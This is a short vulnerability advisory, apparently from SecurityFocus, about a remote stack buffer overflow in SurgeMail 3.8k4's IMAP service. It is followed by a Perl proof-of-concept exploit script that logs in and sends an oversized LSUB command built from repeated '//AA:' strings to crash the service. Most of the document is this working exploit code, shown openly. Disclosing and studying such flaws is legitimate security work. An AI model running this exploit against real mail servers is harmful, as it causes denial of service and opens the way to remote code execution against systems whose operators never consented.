source: http://www.securityfocus.com/bid/28377/info

SurgeMail is prone to a remote stack-based buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input.

Successfully exploiting this issue may allow remote attackers to execute arbitrary machine code in the context of the affected service. Failed exploit attempts will likely result in denial-of-service conditions.

SurgeMail 3.8k4 is vulnerable; other versions may also be affected.

#
#
#       Surgemail stack overflow PoC exploit - latest version
#	Coded by Leon Juranic <leon.juranic@infigo.hr>
#	http://www.infigo.hr/en/
#

use IO::Socket;


$host = "192.168.0.15";
$user = "test";
$pass = "test";
$str = "//AA:";

$sock = IO::Socket::INET->new(PeerAddr => $host,
        PeerPort => "143",
        Proto    => "tcp") || die ("Cannot connect!!!\n");



        print $a = <$sock>;
        print $sock "a001 LOGIN $user $pass\r\n";
        print $a = <$sock>;
        print $sock "a002 LSUB " . $str x 12000 . " " . $str x 21000 . "\r\n";
        print $a = <$sock>;